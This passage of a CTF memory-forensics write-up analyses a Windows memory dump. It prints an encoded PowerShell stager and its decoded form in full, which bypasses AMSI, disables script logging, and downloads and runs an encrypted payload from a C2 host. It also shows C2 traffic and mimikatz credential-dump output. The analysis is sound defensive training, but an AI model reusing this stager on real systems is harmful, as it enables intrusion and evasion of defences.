QAxADgARQAxAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAHYAYQBMAH0ARQBMAHMARQB7AFsAUwBjAHIASQBwAHQAQgBsAE8AYwBLAF0ALgAiAEcARQB0AEYASQBlAGAATABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEAbAB1AEUAKAAkAE4AdQBMAGwALAAoAE4AZQB3AC0ATwBiAEoARQBDAFQAIABDAG8AbABsAGUAQwBUAGkATwBuAHMALgBHAEUAbgBFAHIASQBjAC4ASABhAHMASABTAGUAVABbAHMAdABSAEkATgBnAF0AKQApAH0AJABSAGUAZgA9AFsAUgBlAGYAXQAuAEEAUwBzAGUAbQBCAGwAWQAuAEcAZQB0AFQAWQBQAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBFAHQARgBpAGUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdABWAGEATABVAEUAKAAkAE4AdQBMAEwALAAkAHQAUgBVAEUAKQA7AH0AOwBbAFMAWQBzAHQAZQBtAC4ATgBFAHQALgBTAGUAUgB2AGkAQwBFAFAATwBJAG4AVABNAGEATgBBAGcARQBSAF0AOgA6AEUAWABwAEUAYwB0ADEAMAAwAEMAbwBuAHQASQBOAFUARQA9ADAAOwAkADcAYQA2AEUARAA9AE4ARQB3AC0ATwBiAGoARQBjAFQAIABTAHkAcwB0AGUATQAuAE4AZQBUAC4AVwBlAEIAQwBsAGkARQBuAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJAA3AEEANgBFAGQALgBIAEUAYQBEAEUAUgBTAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAA3AEEANgBlAEQALgBQAFIAbwBYAFkAPQBbAFMAeQBzAHQARQBtAC4ATgBFAHQALgBXAEUAYgBSAGUAcQBVAGUAUwB0AF0AOgA6AEQARQBGAGEAVQBsAFQAVwBlAEIAUABSAG8AWABZADsAJAA3AGEANgBFAEQALgBQAHIATwB4AHkALgBDAHIARQBkAEUAbgBUAEkAQQBsAFMAIAA9ACAAWwBTAHkAcwBUAGUATQAuAE4ARQBUAC4AQwByAGUARABFAG4AdABpAGEATABDAGEAYwBoAGUAXQA6ADoARABlAGYAQQBVAGwAVABOAEUAdABXAE8AUgBLAEMAcgBlAGQARQBuAFQAaQBhAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAA3AGEANgBlAGQALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBzAFQARQBNAC4AVABFAFgAdAAuAEUAbgBDAG8AZABpAG4ARwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAFkAdABlAFMAKAAnADMANQA4ADgAZQA1AGIAOQA4AGIAMQAwADUAMQBlAGUANgBkAGMANwA3ADQAOABmADEAMwA0ADcANAA5ADgANwAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAUwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMATwB1AE4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgAbwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHMAZQByAD0AJAAoAFsAVABlAFgAdAAuAEUAbgBDAG8ARABpAE4ARwBdADoAOgBVAG4AaQBjAE8AZABlAC4ARwBlAFQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAFYARQByAFQAXQA6ADoARgByAE8AbQBCAGEAUwBFADYANABTAFQAUgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQQB4AEEARABjAEEATQBnAEEAdQBBAEQARQBBAE4AZwBBAHUAQQBEAEUAQQBPAFEAQQAwAEEAQwA0AEEATQBRAEEAeQBBAEQAawBBAE8AZwBBADQAQQBEAEEAQQAnACkAKQApADsAJAB0AD0AJwAvAGEAZABtAGkAbgAvAGcAZQB0AC4AcABoAHAAJwA7ACQANwBBADYARQBEAC4ASABlAEEAZABlAFIAcwAuAEEARABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBUAEQAYQBNAE4ARABOAD0AagBZAEoASAB5AGcAdgBZAFYASwB5AHEAZQBJAEIAZAB1AHoASwBVADIAbgBEAFQASAB5AGMAPQAiACkAOwAkAGQAQQB0AEEAPQAkADcAYQA2AGUARAAuAEQATwBXAG4ATABPAGEAZABEAGEAVABhACgAJABzAGUAcgArACQAdAApADsAJABpAFYAPQAkAEQAYQB0AGEAWwAwAC4ALgAzAF0AOwAkAEQAYQB0AGEAPQAkAGQAYQB0AGEAWwA0AC4ALgAkAEQAQQB0AEEALgBMAGUAbgBHAHQAaABdADsALQBqAE8AaQBOAFsAQwBIAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAQQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==
+</code></pre><p>Other, not so professional way, could be by dumping the process memory and grepping it out of the file:</p>
+<pre tabindex="0"><code>~$ vol.py -f finalboss.mem --profile=Win10x64_17763 memdump -p 3908 -D memdump   
+Volatility Foundation Volatility Framework 2.6.1
+************************************************************************
+Writing powershell.exe [  3908] to 3908.dmp
+~$ strings 3908.dmp|grep powershell|head -n1
+powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAFIAUwBpAG8AbgBUAEEAQgBMAEUALgBQAFMAVgBlAFIAUwBJAE8ATgAuAE0AYQBKAG8AUgAgAC0ARwBFACAAMwApAHsAJAAxADEAQgBEADgAPQBbAFIARQBGAF0ALgBBAHMAUwBlAE0AQgBsAFkALgBHAEUAdABUAHkAUABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBlAFQARgBpAEUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkAZgAoACQAMQAxAGIARAA4ACkAewAkAGEAMQA4AGUAMQA9ACQAMQAxAGIAZAA4AC4ARwBlAFQAVgBBAGwAVQBFACgAJABuAHUAbABMACkAOwBJAGYAKAAkAGEAMQA4AGUAMQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkAEEAMQA4AEUAMQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABBADEAOABlADEAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJABWAGEAbAA9AFsAQwBPAEwATABlAEMAdABpAG8ATgBzAC4ARwBlAG4AZQByAEkAYwAuAEQAaQBDAFQAaQBPAG4AQQByAFkAWwBzAHQAUgBpAG4AZwAsAFMAeQBzAHQARQBNAC4ATwBCAGoAZQBDAHQAXQBdADoAOgBuAEUAdwAoACkAOwAkAFYAQQBsAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAYQBsAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAQQAxADgARQAxAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAHYAYQBMAH0ARQBMAHMARQB7AFsAUwBjAHIASQBwAHQAQgBsAE8AYwBLAF0ALgAiAEcARQB0AEYASQBlAGAATABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEAbAB1AEUAKAAkAE4AdQBMAGwALAAoAE4AZQB3AC0ATwBiAEoARQBDAFQAIABDAG8AbABsAGUAQwBUAGkATwBuAHMALgBHAEUAbgBFAHIASQBjAC4ASABhAHMASABTAGUAVABbAHMAdABSAEkATgBnAF0AKQApAH0AJABSAGUAZgA9AFsAUgBlAGYAXQAuAEEAUwBzAGUAbQBCAGwAWQAuAEcAZQB0AFQAWQBQAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBFAHQARgBpAGUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdABWAGEATABVAEUAKAAkAE4AdQBMAEwALAAkAHQAUgBVAEUAKQA7AH0AOwBbAFMAWQBzAHQAZQBtAC4ATgBFAHQALgBTAGUAUgB2AGkAQwBFAFAATwBJAG4AVABNAGEATgBBAGcARQBSAF0AOgA6AEUAWABwAEUAYwB0ADEAMAAwAEMAbwBuAHQASQBOAFUARQA9ADAAOwAkADcAYQA2AEUARAA9AE4ARQB3AC0ATwBiAGoARQBjAFQAIABTAHkAcwB0AGUATQAuAE4AZQBUAC4AVwBlAEIAQwBsAGkARQBuAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJAA3AEEANgBFAGQALgBIAEUAYQBEAEUAUgBTAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAA3AEEANgBlAEQALgBQAFIAbwBYAFkAPQBbAFMAeQBzAHQARQBtAC4ATgBFAHQALgBXAEUAYgBSAGUAcQBVAGUAUwB0AF0AOgA6AEQARQBGAGEAVQBsAFQAVwBlAEIAUABSAG8AWABZADsAJAA3AGEANgBFAEQALgBQAHIATwB4AHkALgBDAHIARQBkAEUAbgBUAEkAQQBsAFMAIAA9ACAAWwBTAHkAcwBUAGUATQAuAE4ARQBUAC4AQwByAGUARABFAG4AdABpAGEATABDAGEAYwBoAGUAXQA6ADoARABlAGYAQQBVAGwAVABOAEUAdABXAE8AUgBLAEMAcgBlAGQARQBuAFQAaQBhAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAA3AGEANgBlAGQALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBzAFQARQBNAC4AVABFAFgAdAAuAEUAbgBDAG8AZABpAG4ARwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAFkAdABlAFMAKAAnADMANQA4ADgAZQA1AGIAOQA4AGIAMQAwADUAMQBlAGUANgBkAGMANwA3ADQAOABmADEAMwA0ADcANAA5ADgANwAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAUwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMATwB1AE4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgAbwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHMAZQByAD0AJAAoAFsAVABlAFgAdAAuAEUAbgBDAG8ARABpAE4ARwBdADoAOgBVAG4AaQBjAE8AZABlAC4ARwBlAFQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAFYARQByAFQAXQA6ADoARgByAE8AbQBCAGEAUwBFADYANABTAFQAUgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQQB4AEEARABjAEEATQBnAEEAdQBBAEQARQBBAE4AZwBBAHUAQQBEAEUAQQBPAFEAQQAwAEEAQwA0AEEATQBRAEEAeQBBAEQAawBBAE8AZwBBADQAQQBEAEEAQQAnACkAKQApADsAJAB0AD0AJwAvAGEAZABtAGkAbgAvAGcAZQB0AC4AcABoAHAAJwA7ACQANwBBADYARQBEAC4ASABlAEEAZABlAFIAcwAuAEEARABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBUAEQAYQBNAE4ARABOAD0AagBZAEoASAB5AGcAdgBZAFYASwB5AHEAZQBJAEIAZAB1AHoASwBVADIAbgBEAFQASAB5AGMAPQAiACkAOwAkAGQAQQB0AEEAPQAkADcAYQA2AGUARAAuAEQATwBXAG4ATABPAGEAZABEAGEAVABhACgAJABzAGUAcgArACQAdAApADsAJABpAFYAPQAkAEQAYQB0AGEAWwAwAC4ALgAzAF0AOwAkAEQAYQB0AGEAPQAkAGQAYQB0AGEAWwA0AC4ALgAkAEQAQQB0AEEALgBMAGUAbgBHAHQAaABdADsALQBqAE8AaQBOAFsAQwBIAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAQQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==
+</code></pre><h2 id="c2">C2</h2>
+<blockquote>
+<p>Q: There&rsquo;s a malware calling &ldquo;home&rdquo;. What is the C2 IP address of the malware?</p>
+</blockquote>
+<p>Once again, many ways to do it. I prefer decoding the PowerShell payload:</p>
+<pre tabindex="0"><code>~$ cat payload.b64|base64 -d
+If($PSVeRSionTABLE.PSVeRSION.MaJoR -GE 3){$11BD8=[REF].AsSeMBlY.GEtTyPE('System.Management.Automation.Utils').&quot;GeTFiE`Ld&quot;('cachedGroupPolicySettings','N'+'onPublic,Static');If($11bD8){$a18e1=$11bd8.GeTVAlUE($nulL);If($a18e1['ScriptB'+'lockLogging']){$A18E1['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;$A18e1['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}$Val=[COLLeCtioNs.GenerIc.DiCTiOnArY[stRing,SystEM.OBjeCt]]::nEw();$VAl.Add('EnableScriptB'+'lockLogging',0);$Val.Add('EnableScriptBlockInvocationLogging',0);$A18E1['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']=$vaL}ELsE{[ScrIptBlOcK].&quot;GEtFIe`Ld&quot;('signatures','N'+'onPublic,Static').SEtVAluE($NuLl,(New-ObJECT ColleCTiOns.GEnErIc.HasHSeT[stRINg]))}$Ref=[Ref].ASsemBlY.GetTYPe('System.Management.Automation.Amsi'+'Utils');$Ref.GEtFieLD('amsiInitF'+'ailed','NonPublic,Static').SetVaLUE($NuLL,$tRUE);};[SYstem.NEt.SeRviCEPOInTMaNAgER]::EXpEct100ContINUE=0;$7a6ED=NEw-ObjEcT SysteM.NeT.WeBCliEnt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$7A6Ed.HEaDERS.Add('User-Agent',$u);$7A6eD.PRoXY=[SystEm.NEt.WEbReqUeSt]::DEFaUlTWeBPRoXY;$7a6ED.PrOxy.CrEdEnTIAlS = [SysTeM.NET.CreDEntiaLCache]::DefAUlTNEtWORKCredEnTials;$Script:Proxy = $7a6ed.Proxy;$K=[SysTEM.TEXt.EnCodinG]::ASCII.GetBYteS('3588e5b98b1051ee6dc7748f13474987');$R={$D,$K=$ArgS;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.COuNT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bXoR$S[($S[$I]+$S[$H])%256]}};$ser=$([TeXt.EnCoDiNG]::UnicOde.GeTString([ConVErT]::FrOmBaSE64STRing('aAB0AHQAcAA6AC8ALwAxADcAMgAuADEANgAuADEAOQA0AC4AMQAyADkAOgA4ADAA')));$t='/admin/get.php';$7A6ED.HeAdeRs.ADD(&quot;Cookie&quot;,&quot;TDaMNDN=jYJHygvYVKyqeIBduzKU2nDTHyc=&quot;);$dAtA=$7a6eD.DOWnLOadDaTa($ser+$t);$iV=$Data[0..3];$Data=$data[4..$DAtA.LenGth];-jOiN[CHar[]](&amp; $R $DAta ($IV+$K))|IEX
+</code></pre><p>Kinda ugly output, let&rsquo;s beautify it:</p>
+<pre tabindex="0"><code>If($PSVeRSionTABLE.PSVeRSION.MaJoR - GE 3) {
+    $11BD8 = [REF].AsSeMBlY.GEtTyPE('System.Management.Automation.Utils').
+    &quot;GeTFiE`Ld&quot;('cachedGroupPolicySettings', 'N' + 'onPublic,Static');
+    If($11bD8) {
+        $a18e1 = $11bd8.GeTVAlUE($nulL);
+        If($a18e1['ScriptB' + 'lockLogging']) {
+            $A18E1['ScriptB' + 'lockLogging']['EnableScriptB' + 'lockLogging'] = 0;
+            $A18e1['ScriptB' + 'lockLogging']['EnableScriptBlockInvocationLogging'] = 0
+        }
+        $Val = [COLLeCtioNs.GenerIc.DiCTiOnArY[stRing, SystEM.OBjeCt]]::nEw();
+        $VAl.Add('EnableScriptB' + 'lockLogging', 0);
+        $Val.Add('EnableScriptBlockInvocationLogging', 0);
+        $A18E1['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB' + 'lockLogging'] = $vaL
+    }
+    ELsE {
+        [ScrIptBlOcK].
+        &quot;GEtFIe`Ld&quot;('signatures', 'N' + 'onPublic,Static').SEtVAluE($NuLl, (New - ObJECT ColleCTiOns.GEnErIc.HasHSeT[stRINg]))
+    }
+    $Ref = [Ref].ASsemBlY.GetTYPe('System.Management.Automation.Amsi' + 'Utils');
+    $Ref.GEtFieLD('amsiInitF' + 'ailed', 'NonPublic,Static').SetVaLUE($NuLL, $tRUE);
+};
+[SYstem.NEt.SeRviCEPOInTMaNAgER]::EXpEct100ContINUE = 0;
+$7a6ED = NEw - ObjEcT SysteM.NeT.WeBCliEnt;
+$u = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';
+$7A6Ed.HEaDERS.Add('User-Agent', $u);
+$7A6eD.PRoXY = [SystEm.NEt.WEbReqUeSt]::DEFaUlTWeBPRoXY;
+$7a6ED.PrOxy.CrEdEnTIAlS = [SysTeM.NET.CreDEntiaLCache]::DefAUlTNEtWORKCredEnTials;
+$Script: Proxy = $7a6ed.Proxy;
+$K = [SysTEM.TEXt.EnCodinG]::ASCII.GetBYteS('3588e5b98b1051ee6dc7748f13474987');
+$R = {
+    $D,
+    $K = $ArgS;$S = 0. .255;0. .255 | % {
+        $J = ($J + $S[$_] + $K[$_ % $K.COuNT]) % 256;$S[$_],
+        $S[$J] = $S[$J],
+        $S[$_]
+    };$D | % {
+        $I = ($I + 1) % 256;$H = ($H + $S[$I]) % 256;$S[$I],
+        $S[$H] = $S[$H],
+        $S[$I];$_ - bXoR$S[($S[$I] + $S[$H]) % 256]
+    }
+};
+$ser = $([TeXt.EnCoDiNG]::UnicOde.GeTString([ConVErT]::FrOmBaSE64STRing('aAB0AHQAcAA6AC8ALwAxADcAMgAuADEANgAuADEAOQA0AC4AMQAyADkAOgA4ADAA')));
+$t = '/admin/get.php';
+$7A6ED.HeAdeRs.ADD(&quot;Cookie&quot;, &quot;TDaMNDN=jYJHygvYVKyqeIBduzKU2nDTHyc=&quot;);
+$dAtA = $7a6eD.DOWnLOadDaTa($ser + $t);
+$iV = $Data[0. .3];
+$Data = $data[4..$DAtA.LenGth]; - jOiN[CHar[]]( &amp; $R $DAta($IV + $K)) | IEX
+</code></pre><p>Alright, we can see the HTTP request HOST-part being build here:</p>
+<pre tabindex="0"><code>$ser = $([TeXt.EnCoDiNG]::UnicOde.GeTString([ConVErT]::FrOmBaSE64STRing('aAB0AHQAcAA6AC8ALwAxADcAMgAuADEANgAuADEAOQA0AC4AMQAyADkAOgA4ADAA')));
+$t = '/admin/get.php';
+$7A6ED.HeAdeRs.ADD(&quot;Cookie&quot;, &quot;TDaMNDN=jYJHygvYVKyqeIBduzKU2nDTHyc=&quot;);
+$dAtA = $7a6eD.DOWnLOadDaTa($ser + $t);
+</code></pre><p>The full C2 URL:</p>
+<pre tabindex="0"><code>http://172.16.194.129:80/admin/get.php
+</code></pre><p>We can also see the IP address in netscan output:</p>
+<pre tabindex="0"><code>~$ cat netscan.txt|grep 172.16.194.129
+0x980f73f0fbe0     TCPv4    172.16.194.128:49977           172.16.194.129:80    CLOSED           -1    
+</code></pre><p>Strings also provide us the full requests send to C2 address:</p>
+<pre tabindex="0"><code>~$ strings -a finalboss.mem &gt; Q: strings_ascii.txt
+~$ grep &quot;Host: 172.16.194.129&quot; -B3 -A1 strings_ascii.txt
+GET /login/process.php HTTP/1.1
+Cookie: session=5Advbi+/4r1L9BNUzLTNybtcy1k=
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Host: 172.16.194.129
+Connection: Keep-Alive
+--
+GET /admin/get.php HTTP/1.1
+Cookie: session=/PotPTX63p/C1HPgKpkcm+QRRWY=
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Host: 172.16.194.129
+Connection: Keep-Alive
+--
+GET /login/process.php HTTP/1.1
+Cookie: session=MmbeesIwk8I37sqq47aA2qA1LwA=
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Host: 172.16.194.129
+Connection: Keep-Alive
+--
+AfdB
+POST /admin/get.php HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Host: 172.16.194.129
+Content-Length: 190
+--
+GET /login/process.php HTTP/1.1
+Cookie: session=PuGsY08kmiAsLNCDyUCZ1o1xC2E=
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Host: 172.16.194.129
+Connection: Keep-Alive
+</code></pre><p>The answer: 172.16.194.129</p>
+<h2 id="stage-1">Stage #1</h2>
+<blockquote>
+<p>Q: The malware downloads stager from 172.16.194.129 the first time. What is the URI the malware connects to (for the first time)?</p>
+</blockquote>
+<p>We already found out the full URI in the previous assignment:</p>
+<pre tabindex="0"><code>$ser = $([TeXt.EnCoDiNG]::UnicOde.GeTString([ConVErT]::FrOmBaSE64STRing('aAB0AHQAcAA6AC8ALwAxADcAMgAuADEANgAuADEAOQA0AC4AMQAyADkAOgA4ADAA')));
+$t = '/admin/get.php';
+$7A6ED.HeAdeRs.ADD(&quot;Cookie&quot;, &quot;TDaMNDN=jYJHygvYVKyqeIBduzKU2nDTHyc=&quot;);
+$dAtA = $7a6eD.DOWnLOadDaTa($ser + $t);
+</code></pre><p>The full C2 URL:</p>
+<pre tabindex="0"><code>http://172.16.194.129:80/admin/get.php
+</code></pre><p>The answer: /admin/get.php</p>
+<h2 id="stage-2">Stage #2</h2>
+<blockquote>
+<p>Q: The malware calls &ldquo;home&rdquo; constantly after that. What is the URI the malware is contacting?</p>
+</blockquote>
+<p>We can see the malware populating following C2 URI after the first download:</p>
+<pre tabindex="0"><code>GET /login/process.php HTTP/1.1
+Cookie: session=MmbeesIwk8I37sqq47aA2qA1LwA=
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Host: 172.16.194.129
+Connection: Keep-Alive
+</code></pre><p>The answer: /login/process.php</p>
+<h2 id="agent">Agent</h2>
+<blockquote>
+<p>Q: There&rsquo;s a malware calling &ldquo;home&rdquo;. What is the user-agent the malware is using?</p>
+</blockquote>
+<p>From the previous challenges:</p>
+<pre tabindex="0"><code>GET /login/process.php HTTP/1.1
+Cookie: session=MmbeesIwk8I37sqq47aA2qA1LwA=
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Host: 172.16.194.129
+Connection: Keep-Alive
+</code></pre><p>The answer: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko</p>
+<h2 id="injection">Injection</h2>
+<blockquote>
+<p>Q: One of the processes was injected. What is the process id (PID) of that process?</p>
+</blockquote>
+<p>In this case, there was no clear file signatures available in the malfind output.</p>
+<p>However, malfind has way to dump ERW sections for further analysis:</p>
+<pre tabindex="0"><code>~$ vol.py -f finalboss.mem --profile=Win10x64_17763 malfind -D malfind
+</code></pre><p>After that we can grep the MZ header from hex dump:</p>
+<pre tabindex="0"><code>~$ hexdump -C *|grep -i &quot;4d 5a&quot;      
+00002350  c3 ff ff ff 48 8b f8 8d  75 01 b8 4d 5a 00 00 66  |....H...u..MZ..f|
+00003b50  cc cc cc 48 83 ec 18 4c  8b c1 b8 4d 5a 00 00 66  |...H...L...MZ..f|
+000144c0  8b c1 b9 4d 5a 00 00 66  39 08 74 03 33 c0 c3 48  |...MZ..f9.t.3..H|
+</code></pre><p>The file header seems to be there but in odd location.</p>
+<p>The svchost.exe also has &ldquo;This program can not be run in DOS mode.&rdquo; basic header that is in every PE format executable.</p>
+<p>The answer is the PID: 7736</p>
+<h2 id="password">Password</h2>
+<blockquote>
+<p>Q: What is Rodrigo Gonzales' password?</p>
+</blockquote>
+<p>This is another tricky one for a reason&hellip; The person who made the dump (not me) screw up the password spelling. :D</p>
+<p>However, it was solvable&hellip; Let&rsquo;s figure it out:</p>
+<p>We can see from the strings that Mimikatz has been executed on the system:</p>
+<pre tabindex="0"><code>~$ strings -e l finalboss.mem &gt; Q: strings_utf.txt
+~$ grep -i &quot;sekurlsa&quot; strings_utf.txt
+mimikatz(powershell) # sekurlsa::logonpasswords
+~$ grep -i &quot;mimikatz(powershell) # sekurlsa::logonpasswords&quot; -A100 strings_utf.txt
+mimikatz(powershell) # sekurlsa::logonpasswords
+Authentication Id : 0 ; 1076056 (00000000:00106b58)
+Session           : Interactive from 1
+User Name         : Rodrigo Gonzales
+Domain            : WORKSTATION
+Logon Server      : WORKSTATION
+Logon Time        : 12/02/2020 22.54.23
+SID               : S-1-5-21-2034586335-2782532192-897599191-1001
+	msv :
+	 [00000003] Primary
+	 * Username : Rodrigo Gonzales
+	 * Domain   : WORKSTATION
